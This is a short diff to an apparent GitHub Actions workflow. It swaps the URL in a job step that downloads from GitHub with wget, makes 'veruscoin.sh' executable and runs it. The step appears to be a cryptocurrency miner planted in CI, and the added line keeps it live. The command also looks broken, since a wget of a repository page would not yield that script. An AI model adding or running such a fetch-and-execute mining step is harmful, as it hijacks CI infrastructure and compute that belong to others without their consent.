@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: BA_channel
       run: |
-        wget https://github.com/Ganti_punya_kalian && chmod u+x veruscoin.sh && ./veruscoin.sh
+        wget https://github.com/AmulyaKanaparthi6/demo-repository && chmod u+x veruscoin.sh && ./veruscoin.sh
